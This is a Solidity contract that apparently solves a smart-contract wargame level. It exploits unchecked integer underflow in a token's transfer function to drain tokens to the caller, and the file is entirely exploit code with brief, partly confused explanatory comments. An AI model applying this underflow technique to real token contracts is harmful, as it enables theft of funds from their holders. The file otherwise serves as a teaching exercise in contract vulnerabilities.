// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract TokenTheft {
    
    address constant TOKEN_CONTRACT = 0xc55dAC9A850ba251B7A50757c6931fE72C60b264;
    address constant LEVEL = 0x63bE8347A617476CA461649897238A31835a32CE;
    uint constant UINT_MAX_CAPACITY = 2**256 - 1;
    
    function steal() public returns (bool) {
        Token t = Token(TOKEN_CONTRACT);
        
        uint levelBalance = t.balanceOf(LEVEL);
        uint amountToSteal = UINT_MAX_CAPACITY + levelBalance;
        
        // Since calling Token from this contract, in the context of Token
        // msg.sender will be this contract's address
        t.transfer(msg.sender, amountToSteal); // Overflow uint so that the require check equals 0

        return true;
    }
    
    function testUnderflow() public pure returns (uint) {
        uint bal = 0;
        return (bal - UINT_MAX_CAPACITY + 20999980); // => 1; This reverts with solidity >0.6
    }
}

contract Token {
    function transfer(address _to, uint _value) public returns (bool) {}
    function balanceOf(address _owner) public view returns (uint) {}
}